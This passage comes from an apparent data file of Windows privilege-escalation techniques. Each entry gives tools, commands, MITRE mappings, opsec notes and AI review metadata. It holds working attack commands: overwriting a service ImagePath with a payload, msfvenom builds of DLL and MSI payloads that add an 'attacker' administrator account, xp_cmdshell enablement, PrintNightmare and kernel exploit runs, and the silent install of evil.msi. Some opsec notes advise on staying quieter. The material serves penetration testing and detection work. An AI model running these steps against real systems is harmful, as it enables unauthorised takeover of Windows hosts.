        "code": "accesschk.exe -kvuqsw hklm\\System\\CurrentControlSet\\Services /accepteula",
        "lang": "cmd"
      },
      {
        "label": "Overwrite ImagePath",
        "code": "reg add HKLM\\SYSTEM\\CurrentControlSet\\Services\\<svc> /v ImagePath /t REG_EXPAND_SZ /d \"C:\\Temp\\payload.exe\" /f",
        "lang": "cmd"
      }
    ],
    "mitre": {
      "id": "T1574.011",
      "url": "https://attack.mitre.org/techniques/T1574/011/"
    },
    "requires": [
      "Write access to a service registry key",
      "Ability to restart the service or reboot"
    ],
    "opsec": "Registry modification of ImagePath on a service key is a high-fidelity detection: the write event is logged the moment it happens (Sysmon Event ID 13, Security 4657) regardless of any later reversion. Restore the value afterward for operational cleanup and to avoid breaking the service, not to evade detection (restoring only adds a second change event).",
    "references": [
      {
        "label": "Microsoft — Registry Key Security and Access Rights",
        "url": "https://learn.microsoft.com/en-us/windows/win32/sysinfo/registry-key-security-and-access-rights",
        "kind": "primary"
      },
      {
        "label": "Microsoft — Database of Installed Services",
        "url": "https://learn.microsoft.com/en-us/windows/win32/services/database-of-installed-services",
        "kind": "primary"
      }
    ],
    "review": {
      "status": "source-reviewed",
      "reviewedAt": "2026-09-07",
      "reviewedBy": "Codex",
      "reviewerType": "ai",
      "scope": "Selected foundational definitions of authentication, Windows management, service configuration and securable objects. These sources support only the listed conceptual claims. Excludes technique mechanics, commands, tools, prerequisites, applicability, version or algorithm details, connection outcomes, attack-path viability and ATT&CK mappings. Navigation labels remain project conventions.",
      "reviewedContent": {
        "affects": "All supported Windows versions (configuration weakness).",
        "commands": [
          {
            "code": "accesschk.exe -kvuqsw hklm\\System\\CurrentControlSet\\Services /accepteula",
            "label": "Find writable service keys",
            "lang": "cmd"
          },
          {
            "code": "reg add HKLM\\SYSTEM\\CurrentControlSet\\Services\\<svc> /v ImagePath /t REG_EXPAND_SZ /d \"C:\\Temp\\payload.exe\" /f",
            "label": "Overwrite ImagePath",
            "lang": "cmd"
          }
        ],
        "description": "Registry keys have security descriptors and access rights in the Windows security model. The Service Control Manager stores its installed-service database in the registry. Registry permissions describe access to stored configuration; the service database describes the installed services.",
        "id": "pe-weak-registry-service",
        "label": "Weak Service Registry Perms",
        "mitre": {
          "id": "T1574.011",
          "url": "https://attack.mitre.org/techniques/T1574/011/"
        },
        "opsec": "Registry modification of ImagePath on a service key is a high-fidelity detection: the write event is logged the moment it happens (Sysmon Event ID 13, Security 4657) regardless of any later reversion. Restore the value afterward for operational cleanup and to avoid breaking the service, not to evade detection (restoring only adds a second change event).",
        "phase": "finding",
        "references": [
          {
            "kind": "primary",
            "label": "Microsoft — Registry Key Security and Access Rights",
            "url": "https://learn.microsoft.com/en-us/windows/win32/sysinfo/registry-key-security-and-access-rights"
          },
          {
            "kind": "primary",
            "label": "Microsoft — Database of Installed Services",
            "url": "https://learn.microsoft.com/en-us/windows/win32/services/database-of-installed-services"
          }
        ],
        "requires": [
          "Write access to a service registry key",
          "Ability to restart the service or reboot"
        ],
        "summary": "Understand registry access control and installed-service records.",
        "tools": [
          {
            "name": "accesschk (Sysinternals)",
            "url": "https://learn.microsoft.com/en-us/sysinternals/downloads/accesschk"
          }
        ]
      },
      "claims": [
        {
          "text": "Windows controls access to registry keys using security descriptors and access rights.",
          "section": "Microsoft — Registry Key Security and Access Rights — Opening definition and security-descriptor paragraphs",
          "sources": [
            "https://learn.microsoft.com/en-us/windows/win32/sysinfo/registry-key-security-and-access-rights"
          ]
        },
        {
          "text": "The Service Control Manager maintains its installed-service database in the registry.",
          "section": "Microsoft — Database of Installed Services — Opening database definition",
          "sources": [
            "https://learn.microsoft.com/en-us/windows/win32/services/database-of-installed-services"
          ]
        }
      ]
    }
  },

  // ── DLL & PATH Hijacking ────────────────────────────────────────────────────
  {
    "id": "pe-service-dll-hijack",
    "label": "Service DLL Hijacking",
    "phase": "finding",
    "summary": "Understand how loaded DLLs relate to processes and threads.",
    "affects": "All supported Windows versions (depends on the service).",
    "description": "A process is an executing program with one or more threads. A loaded DLL is mapped into the process's virtual address space, and its exported functions run in the context of the calling thread. The library, the process and the thread describe related but distinct parts of program execution.",
    "tools": [
      {
        "name": "Process Monitor (Sysinternals)",
        "url": "https://learn.microsoft.com/en-us/sysinternals/downloads/procmon"
      },
      {
        "name": "msfvenom (Metasploit)",
        "url": "https://github.com/rapid7/metasploit-framework"
      }
    ],
    "commands": [
      {
        "label": "Generate an x64 add-admin DLL (EXITFUNC=thread keeps the hijacked service alive)",
        "code": "msfvenom -p windows/x64/exec CMD='net localgroup administrators attacker /add' EXITFUNC=thread -f dll -o hijack.dll",
        "lang": "bash"
      }
    ],
    "mitre": {
      "id": "T1574.001",
      "url": "https://attack.mitre.org/techniques/T1574/001/"
    },
    "requires": [
      "Privileged service that loads a DLL from a writable / missing path",
      "Ability to restart it"
    ],
    "opsec": "An unsigned DLL loaded by a signed service binary from a user-writable directory (Sysmon Event ID 7) is a strong detection signal.",
    "references": [
      {
        "label": "Microsoft — Processes and Threads",
        "url": "https://learn.microsoft.com/en-us/windows/win32/procthread/processes-and-threads",
        "kind": "primary"
      },
      {
        "label": "Microsoft — About Dynamic-Link Libraries",
        "url": "https://learn.microsoft.com/en-us/windows/win32/dlls/about-dynamic-link-libraries",
        "kind": "primary"
      }
    ],
    "review": {
      "status": "source-reviewed",
      "reviewedAt": "2026-09-07",
      "reviewedBy": "Codex",
      "reviewerType": "ai",
      "scope": "Selected foundational definitions of authentication, Windows management, service configuration and securable objects. These sources support only the listed conceptual claims. Excludes technique mechanics, commands, tools, prerequisites, applicability, version or algorithm details, connection outcomes, attack-path viability and ATT&CK mappings. Navigation labels remain project conventions.",
      "reviewedContent": {
        "affects": "All supported Windows versions (depends on the service).",
        "commands": [
          {
            "code": "msfvenom -p windows/x64/exec CMD='net localgroup administrators attacker /add' EXITFUNC=thread -f dll -o hijack.dll",
            "label": "Generate an x64 add-admin DLL (EXITFUNC=thread keeps the hijacked service alive)",
            "lang": "bash"
          }
        ],
        "description": "A process is an executing program with one or more threads. A loaded DLL is mapped into the process's virtual address space, and its exported functions run in the context of the calling thread. The library, the process and the thread describe related but distinct parts of program execution.",
        "id": "pe-service-dll-hijack",
        "label": "Service DLL Hijacking",
        "mitre": {
          "id": "T1574.001",
          "url": "https://attack.mitre.org/techniques/T1574/001/"
        },
        "opsec": "An unsigned DLL loaded by a signed service binary from a user-writable directory (Sysmon Event ID 7) is a strong detection signal.",
        "phase": "finding",
        "references": [
          {
            "kind": "primary",
            "label": "Microsoft — Processes and Threads",
            "url": "https://learn.microsoft.com/en-us/windows/win32/procthread/processes-and-threads"
          },
          {
            "kind": "primary",
            "label": "Microsoft — About Dynamic-Link Libraries",
            "url": "https://learn.microsoft.com/en-us/windows/win32/dlls/about-dynamic-link-libraries"
          }
        ],
        "requires": [
          "Privileged service that loads a DLL from a writable / missing path",
          "Ability to restart it"
        ],
        "summary": "Understand how loaded DLLs relate to processes and threads.",
        "tools": [
          {
            "name": "Process Monitor (Sysinternals)",
            "url": "https://learn.microsoft.com/en-us/sysinternals/downloads/procmon"
          },
          {
            "name": "msfvenom (Metasploit)",
            "url": "https://github.com/rapid7/metasploit-framework"
          }
        ]
      },
      "claims": [
        {
          "text": "A process is an executing program, and one or more threads run within its context.",
          "section": "Microsoft — Processes and Threads — Opening process and thread definitions",
          "sources": [
            "https://learn.microsoft.com/en-us/windows/win32/procthread/processes-and-threads"
          ]
        },
        {
          "text": "A loaded DLL is mapped into the process's virtual address space, and an exported function runs in the calling thread's context.",
          "section": "Microsoft — About Dynamic-Link Libraries — DLLs and Memory Management",
          "sources": [
            "https://learn.microsoft.com/en-us/windows/win32/dlls/about-dynamic-link-libraries"
          ]
        }
      ]
    }
  },
  {
    id: 'pe-path-dll-hijack',
    label: 'Writable %PATH% Directory',
    phase: 'finding',
    summary: 'Plant a DLL a privileged service resolves by name from %PATH%.',
    affects: 'All supported Windows versions (depends on a writable PATH entry).',
    description: r`If a directory listed in the system PATH is writable by your user, a privileged process or service that loads a DLL by bare name (no full path) can resolve it from your writable directory. Under the default DLL search order, PATH is searched LAST (after the application directory, System32, the Windows directory, and the current directory), so this only works for a DLL the target does NOT already resolve from one of those earlier locations, i.e. a missing / "ghost" DLL. Drop a matching DLL whose DllMain runs your payload; it loads into the privileged process. Distinct from a per-app DLL hijack: here the weakness is a globally writable PATH entry.`,
    tools: [
      { name: 'accesschk (Sysinternals)', url: 'https://learn.microsoft.com/en-us/sysinternals/downloads/accesschk' },
      { name: 'PowerUp (Find-PathDLLHijack)', url: 'https://github.com/PowerShellMafia/PowerSploit' },
    ],
    commands: [
      { label: 'Show the system PATH', code: r`reg query "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Environment" /v Path`, lang: 'cmd' },
      { label: 'Check each PATH dir for write access (scoped to a principal you control)', code: r`accesschk.exe -uwdq "Users" "C:\SomePathDir" /accepteula`, lang: 'cmd' },
    ],
    mitre: mitre('T1574.007'),
    references: [{ label: 'MITRE T1574.007, Path Interception by PATH Env Var', url: 'https://attack.mitre.org/techniques/T1574/007/' }],
    requires: ['A user-writable directory on the system PATH', 'A privileged service/process that DLL-loads by bare name'],
    opsec: 'An unsigned DLL loaded by a signed, privileged binary from a user-writable PATH directory (Sysmon Event ID 7) is a strong signal.',
  },

  // ── Scheduled Tasks & Autoruns ──────────────────────────────────────────────
  {
    "id": "pe-autorun-writable",
    "label": "Writable Autorun",
    "phase": "finding",
    "summary": "Understand the security of logon startup registrations.",
    "affects": "All supported Windows versions (configuration weakness).",
    "description": "Windows provides Run and RunOnce registrations for programs associated with user logon. Run is intended for repeated startup and RunOnce for a single invocation. Registry keys are securable objects with security descriptors and access rights. The purpose of a startup registration and the permissions on its registry key are separate parts of the configuration.",
    "tools": [
      {
        "name": "Autoruns (Sysinternals)",
        "url": "https://learn.microsoft.com/en-us/sysinternals/downloads/autoruns"
      },
      {
        "name": "WinPEAS",
        "url": "https://github.com/peass-ng/PEASS-ng"
      }
    ],
    "commands": [
      {
        "label": "List the HKLM Run key (the escalation target: fires for whoever logs on)",
        "code": "reg query HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run",
        "lang": "cmd"
      },
      {
        "label": "List the HKCU Run key (context only: runs as the current user, useful for finding writable target binaries)",
        "code": "reg query HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run",
        "lang": "cmd"
      },
      {
        "label": "Check write access to the target binary",
        "code": "accesschk.exe -wvu \"C:\\Path\\To\\autorun.exe\" /accepteula",
        "lang": "cmd"
      }
    ],
    "mitre": {
      "id": "T1547.001",
      "url": "https://attack.mitre.org/techniques/T1547/001/"
    },
    "requires": [
      "Writable autorun binary or writable Run key",
      "A higher-privileged user logs in"
    ],
    "opsec": "Requires waiting for an admin logon. New/changed autorun entries are a classic detection (Autoruns, Sysmon).",
    "references": [
      {
        "label": "Microsoft, Run and RunOnce Registry Keys",
        "url": "https://learn.microsoft.com/en-us/windows/win32/setupapi/run-and-runonce-registry-keys",
        "section": "Opening purpose and repeated/one-time distinction",
        "kind": "primary"
      },
      {
        "label": "Microsoft, Registry Key Security and Access Rights",
        "url": "https://learn.microsoft.com/en-us/windows/win32/sysinfo/registry-key-security-and-access-rights",
        "section": "Opening key security-descriptor and access-check explanation",
        "kind": "primary"
      }
    ],
    "review": {
      "status": "source-reviewed",
      "reviewedAt": "2026-09-07",
      "reviewedBy": "Codex",
      "reviewerType": "ai",
      "scope": "Selected conceptual claims about execution identities, processor modes, and task/startup permissions. Excludes commands, tools, prerequisites, applicability, connection outcomes, route viability, and ATT&CK mappings. Navigation labels remain project conventions.",
      "reviewedContent": {
        "affects": "All supported Windows versions (configuration weakness).",
        "commands": [
          {
            "code": "reg query HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run",
            "label": "List the HKLM Run key (the escalation target: fires for whoever logs on)",
            "lang": "cmd"
          },
          {
            "code": "reg query HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run",
            "label": "List the HKCU Run key (context only: runs as the current user, useful for finding writable target binaries)",
            "lang": "cmd"
          },
          {
            "code": "accesschk.exe -wvu \"C:\\Path\\To\\autorun.exe\" /accepteula",
            "label": "Check write access to the target binary",
            "lang": "cmd"
          }
        ],
        "description": "Windows provides Run and RunOnce registrations for programs associated with user logon. Run is intended for repeated startup and RunOnce for a single invocation. Registry keys are securable objects with security descriptors and access rights. The purpose of a startup registration and the permissions on its registry key are separate parts of the configuration.",
        "id": "pe-autorun-writable",
        "label": "Writable Autorun",
        "mitre": {
          "id": "T1547.001",
          "url": "https://attack.mitre.org/techniques/T1547/001/"
        },
        "opsec": "Requires waiting for an admin logon. New/changed autorun entries are a classic detection (Autoruns, Sysmon).",
        "phase": "finding",
        "references": [
          {
            "kind": "primary",
            "label": "Microsoft, Run and RunOnce Registry Keys",
            "section": "Opening purpose and repeated/one-time distinction",
            "url": "https://learn.microsoft.com/en-us/windows/win32/setupapi/run-and-runonce-registry-keys"
          },
          {
            "kind": "primary",
            "label": "Microsoft, Registry Key Security and Access Rights",
            "section": "Opening key security-descriptor and access-check explanation",
            "url": "https://learn.microsoft.com/en-us/windows/win32/sysinfo/registry-key-security-and-access-rights"
          }
        ],
        "requires": [
          "Writable autorun binary or writable Run key",
          "A higher-privileged user logs in"
        ],
        "summary": "Understand the security of logon startup registrations.",
        "tools": [
          {
            "name": "Autoruns (Sysinternals)",
            "url": "https://learn.microsoft.com/en-us/sysinternals/downloads/autoruns"
          },
          {
            "name": "WinPEAS",
            "url": "https://github.com/peass-ng/PEASS-ng"
          }
        ]
      },
      "claims": [
        {
          "text": "Windows documents Run for repeated logon startup and RunOnce for one-time execution.",
          "section": "Microsoft, Run and RunOnce Registry Keys — Opening purpose and repeated/one-time distinction",
          "sources": [
            "https://learn.microsoft.com/en-us/windows/win32/setupapi/run-and-runonce-registry-keys"
          ]
        },
        {
          "text": "Windows controls access to registry keys through security descriptors and key access rights.",
          "section": "Microsoft, Registry Key Security and Access Rights — Opening key security-descriptor and access-check explanation",
          "sources": [
            "https://learn.microsoft.com/en-us/windows/win32/sysinfo/registry-key-security-and-access-rights"
          ]
        }
      ]
    }
  },
  {
    "id": "pe-scheduled-task-abuse",
    "label": "Scheduled Task Abuse",
    "phase": "finding",
    "summary": "Understand permissions on task definitions and their referenced files.",
    "affects": "All supported Windows versions (configuration weakness).",
    "description": "A task's execution identity and permission to manage the task are separate security properties. Task Scheduler uses access controls for reading, updating, deleting, and running tasks. Executable and script files referenced by tasks are also securable objects with their own security descriptors. A defensive review should distinguish the task's permissions from the permissions on its referenced resources.",
    "tools": [
      {
        "name": "schtasks",
        "url": "https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/schtasks"
      },
      {
        "name": "WinPEAS",
        "url": "https://github.com/peass-ng/PEASS-ng"
      }
    ],
    "commands": [
      {
        "label": "Enumerate tasks + run-as user",
        "code": "schtasks /query /fo LIST /v",
        "lang": "cmd"
      },
      {
        "label": "Check write access to a task's target",
        "code": "accesschk.exe -quv \"C:\\Path\\To\\task.exe\" /accepteula",
        "lang": "cmd"
      }
    ],
    "mitre": {
      "id": "T1053.005",
      "url": "https://attack.mitre.org/techniques/T1053/005/"
    },
    "requires": [
      "Writable binary/script invoked by a privileged scheduled task",
      "Task trigger fires (or you can run it)"
    ],
    "opsec": "Event ID 4698/4702 on task changes; file modification of the task target. Overwriting an existing task binary is quieter than creating a new task.",
    "references": [
      {
        "label": "Microsoft, Security Contexts for Tasks",
        "url": "https://learn.microsoft.com/en-us/windows/win32/taskschd/security-contexts-for-running-tasks",
        "section": "Opening context definition; Specifying Credentials; task permissions",
        "kind": "primary"
      },
      {
        "label": "Microsoft, File Security and Access Rights",
        "url": "https://learn.microsoft.com/en-us/windows/win32/fileio/file-security-and-access-rights",
        "section": "Opening file/directory security-descriptor and access-check explanation",
        "kind": "primary"
      }
    ],
    "review": {
      "status": "source-reviewed",
      "reviewedAt": "2026-09-07",
      "reviewedBy": "Codex",
      "reviewerType": "ai",
      "scope": "Selected conceptual claims about execution identities, processor modes, and task/startup permissions. Excludes commands, tools, prerequisites, applicability, connection outcomes, route viability, and ATT&CK mappings. Navigation labels remain project conventions.",
      "reviewedContent": {
        "affects": "All supported Windows versions (configuration weakness).",
        "commands": [
          {
            "code": "schtasks /query /fo LIST /v",
            "label": "Enumerate tasks + run-as user",
            "lang": "cmd"
          },
          {
            "code": "accesschk.exe -quv \"C:\\Path\\To\\task.exe\" /accepteula",
            "label": "Check write access to a task's target",
            "lang": "cmd"
          }
        ],
        "description": "A task's execution identity and permission to manage the task are separate security properties. Task Scheduler uses access controls for reading, updating, deleting, and running tasks. Executable and script files referenced by tasks are also securable objects with their own security descriptors. A defensive review should distinguish the task's permissions from the permissions on its referenced resources.",
        "id": "pe-scheduled-task-abuse",
        "label": "Scheduled Task Abuse",
        "mitre": {
          "id": "T1053.005",
          "url": "https://attack.mitre.org/techniques/T1053/005/"
        },
        "opsec": "Event ID 4698/4702 on task changes; file modification of the task target. Overwriting an existing task binary is quieter than creating a new task.",
        "phase": "finding",
        "references": [
          {
            "kind": "primary",
            "label": "Microsoft, Security Contexts for Tasks",
            "section": "Opening context definition; Specifying Credentials; task permissions",
            "url": "https://learn.microsoft.com/en-us/windows/win32/taskschd/security-contexts-for-running-tasks"
          },
          {
            "kind": "primary",
            "label": "Microsoft, File Security and Access Rights",
            "section": "Opening file/directory security-descriptor and access-check explanation",
            "url": "https://learn.microsoft.com/en-us/windows/win32/fileio/file-security-and-access-rights"
          }
        ],
        "requires": [
          "Writable binary/script invoked by a privileged scheduled task",
          "Task trigger fires (or you can run it)"
        ],
        "summary": "Understand permissions on task definitions and their referenced files.",
        "tools": [
          {
            "name": "schtasks",
            "url": "https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/schtasks"
          },
          {
            "name": "WinPEAS",
            "url": "https://github.com/peass-ng/PEASS-ng"
          }
        ]
      },
      "claims": [
        {
          "text": "A task's access-control list governs permission to read, update, delete, and run it.",
          "section": "Microsoft, Security Contexts for Tasks — Security for Reading, Updating, Deleting, and Running Tasks",
          "sources": [
            "https://learn.microsoft.com/en-us/windows/win32/taskschd/security-contexts-for-running-tasks"
          ]
        },
        {
          "text": "Windows files and directories are securable objects whose security descriptors govern access.",
          "section": "Microsoft, File Security and Access Rights — Security descriptors; File access rights",
          "sources": [
            "https://learn.microsoft.com/en-us/windows/win32/fileio/file-security-and-access-rights"
          ]
        }
      ]
    }
  },

  // ── Privileged App & Service Abuse ──────────────────────────────────────────
  {
    id: 'pe-mssql-xpcmdshell',
    label: 'MSSQL xp_cmdshell',
    phase: 'finding',
    summary: 'Run OS commands as the SQL service account.',
    affects: 'Any Windows host with a local MSSQL instance you are sysadmin on (SQL-version dependent, not OS).',
    description: r`With sysadmin access to a local MSSQL instance, enable and call xp_cmdshell to execute OS commands as the SQL Server service account. If that account holds SeImpersonatePrivilege (common for service accounts), chain into a Potato attack for full SYSTEM.`,
    tools: [{ name: 'impacket-mssqlclient', url: 'https://github.com/fortra/impacket' }],
    commands: [
      { label: 'Enable xp_cmdshell', code: r`EXEC sp_configure 'show advanced options',1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE;`, lang: 'sql' },
      { label: 'Execute as the service account', code: r`EXEC xp_cmdshell 'whoami /priv';`, lang: 'sql' },
    ],
    mitre: mitre('T1059.003'),
    references: [{ label: 'HackTricks, Pentesting MSSQL', url: 'https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-mssql-microsoft-sql-server/index.html' }],
    requires: ['sysadmin role on the MSSQL instance', 'xp_cmdshell enable-able'],
    opsec: 'sp_configure + xp_cmdshell are heavily monitored; many EDRs flag sqlservr.exe spawning cmd.exe.',
  },
  {
    id: 'pe-vuln-software',
    label: 'Vulnerable Third-Party Software',
    phase: 'finding',
    summary: 'Exploit a known LPE in installed software.',
    affects: 'Depends on the installed software, not the Windows build.',
    description: r`Enumerate installed applications and services and match their versions to public local-privilege-escalation CVEs. Vulnerable updaters, agents, VPN clients, and helper services frequently run as SYSTEM and have known exploits. winPEAS flags installed software and writable program directories; an outdated third-party service is often the easiest SYSTEM on the box.`,
    tools: [
      { name: 'WinPEAS', url: 'https://github.com/peass-ng/PEASS-ng' },
      { name: 'Exploit-DB', url: 'https://www.exploit-db.com/' },
    ],
    commands: [
      { label: 'List installed software (registry, no MSI self-repair)', code: r`reg query "HKLM\Software\Microsoft\Windows\CurrentVersion\Uninstall" /s | findstr "DisplayName DisplayVersion"`, lang: 'cmd' },
      { label: '32-bit apps (Wow6432Node, missed by the native hive on 64-bit Windows)', code: r`reg query "HKLM\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall" /s | findstr "DisplayName DisplayVersion"`, lang: 'cmd' },
      { label: 'Non-default service binaries (PowerShell/CIM; wmic is disabled by default on 24H2 and being removed (25H2 upgrade / Server 2025 FoD-only))', code: r`Get-CimInstance Win32_Service | ? { $_.PathName -notlike '*C:\Windows*' } | select Name,PathName,StartMode`, lang: 'powershell' },
    ],
    mitre: mitre('T1068'),
    references: [{ label: 'HackTricks, Windows Local Privilege Escalation', url: 'https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html' }],
    requires: ['Installed software with a known, exploitable LPE'],
    opsec: 'Exploit reliability varies; a crashing helper service is noticeable.',
  },
  {
    id: 'pe-insecure-gui',
    label: 'Insecure GUI App as Admin',
    phase: 'finding',
    summary: 'Break out of a higher-privileged app into a shell.',
    description: r`Any custom or third-party application installed on the host and running at higher privilege is a candidate: a vendor management console, an elevated helper service with a tray UI, line-of-business / in-house software, a kiosk app, or an installer. Such apps are frequently configured to run as Administrator or SYSTEM and are rarely hardened, so they can be coerced into spawning a child process that inherits their privileges: break out through a File > Open/Save dialog (type a path, or right-click > Open in a new window), embedded Help (hh.exe), or a hyperlink that launches a browser you then escape to cmd. The more bespoke software a machine runs elevated, the more of these break-out primitives exist. Enumerate what is installed and how each process runs.`,
    tools: [{ name: 'HackTricks, Windows Local Privilege Escalation', url: 'https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html' }],
    mitre: mitre('T1548'),
    references: [{ label: 'HackTricks, GUI apps & privilege escalation', url: 'https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html' }],
    requires: ['A higher-privileged (admin/SYSTEM) GUI process you can interact with'],
    opsec: 'Spawning cmd from an unexpected parent (a vendor app, an installer, a browser, hh.exe) is a strong process-tree signal.',
    affects: 'Depends on the installed application, not the Windows build.',
  },
  {
    id: 'pe-printnightmare',
    label: 'PrintNightmare (CVE-2021-1675 / CVE-2021-34527)',
    phase: 'finding',
    summary: 'Spooler loads an attacker DLL as SYSTEM.',
    affects: 'Unpatched Windows / Server, pre-July 2021. CVE-2021-1675 was the initial LPE assignment (June 2021); CVE-2021-34527 was assigned for the same RpcAddPrinterDriverEx primitive once the first patch was shown not to stop it, so the two IDs do not split cleanly into local vs remote. Print Spooler must be enabled.',
    description: r`The Print Spooler's RpcAddPrinterDriverEx lets an authenticated user register a printer "driver" DLL that spoolsv.exe (running as SYSTEM) then loads. CVE-2021-1675 was the initial local-privilege-escalation assignment (June 2021 patch); when that patch was shown not to stop the attack, Microsoft assigned CVE-2021-34527 for the same primitive. The identical technique runs your DLL as SYSTEM either locally (point it at an on-disk DLL) or remotely (a UNC/SMB driver path against another host's spooler). Requires the Print Spooler service to be running; fully mitigated by disabling it or patching.`,
    tools: [
      { name: 'SharpPrintNightmare', url: 'https://github.com/cube0x0/CVE-2021-1675' },
      { name: 'mimikatz (misc::printnightmare)', url: 'https://github.com/gentilkiwi/mimikatz' },
    ],
    commands: [
      { label: 'Local LPE via a driver DLL', code: r`SharpPrintNightmare.exe C:\Temp\addCync.dll`, lang: 'cmd' },
    ],
    mitre: mitre('T1068'),
    references: [
      { label: 'MSRC, CVE-2021-1675', url: 'https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-1675' },
      { label: 'MSRC, CVE-2021-34527', url: 'https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-34527' },
    ],
    requires: ['Print Spooler service running', 'Unpatched host'],
    opsec: 'Spooler loading a user-supplied driver DLL is heavily detected post-2021. Disabling the spooler kills it entirely.',
  },

  // ── Standalone: installer policy ────────────────────────────────────────────
  {
    id: 'pe-always-install-elevated',
    label: 'AlwaysInstallElevated',
    phase: 'finding',
    summary: 'Install a malicious MSI that runs as SYSTEM.',
    affects: 'All supported Windows versions (only when the AlwaysInstallElevated policy is enabled in both hives).',
    description: r`If the AlwaysInstallElevated policy DWORD is set to 1 in BOTH HKLM and HKCU, any user can install an MSI package that executes with SYSTEM privileges. Generate a malicious MSI and install it quietly. Both keys must be set; one alone is not exploitable.`,
    tools: [
      { name: 'msfvenom (Metasploit)', url: 'https://github.com/rapid7/metasploit-framework' },
      { name: 'PowerUp', url: 'https://github.com/PowerShellMafia/PowerSploit' },
    ],
    commands: [
      { label: 'Check both hives (both must be 0x1)', code: r`reg query HKLM\Software\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKCU\Software\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated`, lang: 'cmd' },
      { label: 'Build a SYSTEM payload MSI', code: r`msfvenom -p windows/x64/exec cmd='net user attacker P@ssw0rd! /add && net localgroup administrators attacker /add' -f msi -o evil.msi`, lang: 'bash' },
      { label: 'Install silently (transfer evil.msi to C:\\Temp on the target first)', code: r`msiexec /quiet /qn /i C:\Temp\evil.msi`, lang: 'cmd' },
    ],
    mitre: mitre('T1548.002'),
    references: [{ label: 'PentestLab, Always Install Elevated', url: 'https://pentestlab.blog/2017/02/28/always-install-elevated/' }],
    requires: ['AlwaysInstallElevated = 0x1 in HKLM AND HKCU'],
    opsec: 'msiexec installing an unsigned MSI from a temp path is suspicious; the new local admin / process tree is detectable.',
  },

  // ── Known Exploits (CVE) ────────────────────────────────────────────────────
  {
    id: 'pe-kernel-enum',
    label: 'Enumerate Missing Patches',
    phase: 'finding',
    summary: 'Map OS build/hotfixes to known kernel LPEs.',
    affects: 'Triage step; applicability depends on the CVE it surfaces.',
    description: r`Collect systeminfo (OS version + installed KBs) and feed it to WES-NG, the actively-updated primary tool, to list kernel/privilege-escalation CVEs the system is missing patches for. This is the triage step before grabbing a specific exploit binary; prefer it on older/unpatched hosts where service/token misconfigs are absent. Watson is an on-host alternative but is archived/unmaintained (read-only since 2021) and only covers Win10 up to 2004 and Server 2016-2019, so it returns empty/incomplete output on Windows 11, Server 2022, and Win10 20H2+; use Seatbelt or PrivescCheck for on-host checks on modern targets.`,
    tools: [
      { name: 'WES-NG', url: 'https://github.com/bitsadmin/wesng' },
      { name: 'Watson (archived; Win10<=2004 / Server 2016-2019 only)', url: 'https://github.com/rasta-mouse/Watson' },
      { name: 'PrivescCheck', url: 'https://github.com/itm4n/PrivescCheck' },
    ],
    commands: [
      { label: 'Collect target info', code: r`systeminfo > systeminfo.txt`, lang: 'cmd' },
      { label: 'Bootstrap the definitions (fresh clone has none)', code: r`python wes.py --update`, lang: 'bash' },
      { label: 'Analyze offline (attacker host)', code: r`python wes.py systeminfo.txt --muc-lookup`, lang: 'bash' },
    ],
    mitre: mitre('T1068'),
    references: [{ label: 'HackTricks, Windows Local Privilege Escalation', url: 'https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html' }],
    requires: ['Low-priv shell', 'Ability to read OS version / run systeminfo'],
    opsec: 'WES-NG runs offline on the attacker host (invisible). Watson is a .NET assembly run on-target, but it is archived and blind to modern builds. The follow-on kernel exploit is what risks instability.',
  },
  {
    id: 'pe-kernel-exploit',
    label: 'Kernel Exploit (generic)',
    phase: 'finding',
    summary: 'Run a public exploit for an unpatched kernel CVE.',
    affects: 'Depends entirely on the specific CVE and exact build.',
    description: r`Once a missing-patch CVE is identified, run the matching public exploit against a kernel/driver vulnerability to execute code in the kernel and obtain a SYSTEM context (e.g. older targets vulnerable to CVE-2018-8120, MS16-135/CVE-2016-7255, or CVE-2021-1732, all Win32k kernel bugs). Verify the exact build first: wrong-build kernel exploits frequently bugcheck the host.`,
    tools: [{ name: 'SecWiki windows-kernel-exploits', url: 'https://github.com/SecWiki/windows-kernel-exploits' }],
    commands: [
      { label: 'Example (build-specific binary; most kernel PoCs pop a SYSTEM shell rather than take a command)', code: r`.\exploit.exe cmd.exe`, lang: 'cmd' },
    ],
    mitre: mitre('T1068'),
    references: [
      { label: 'NVD, CVE-2018-8120 (Win32k EoP)', url: 'https://nvd.nist.gov/vuln/detail/CVE-2018-8120' },
      { label: 'Microsoft, MS16-135 bulletin (CVE-2016-7255)', url: 'https://learn.microsoft.com/en-us/security-updates/securitybulletins/2016/ms16-135' },
    ],
    requires: ['Confirmed unpatched kernel CVE for the exact OS build'],
    opsec: 'High risk of instability / BSOD on the wrong build. Loud and last-resort; prefer misconfig-based vectors when available.',
  },
  {
    id: 'pe-cve-2023-21768',
    label: 'CVE-2023-21768 (AFD.sys)',
    phase: 'finding',
    summary: 'AFD for WinSock write primitive on Win11 21H2/22H2 and Server 2022; public PoC completes SYSTEM only on 22H2.',
    affects: 'Windows 11 21H2/22H2 and Server 2022, unpatched (pre-Jan 2023).',
    versions: ['win11-21h2', 'win11-22h2', 'srv2022'],
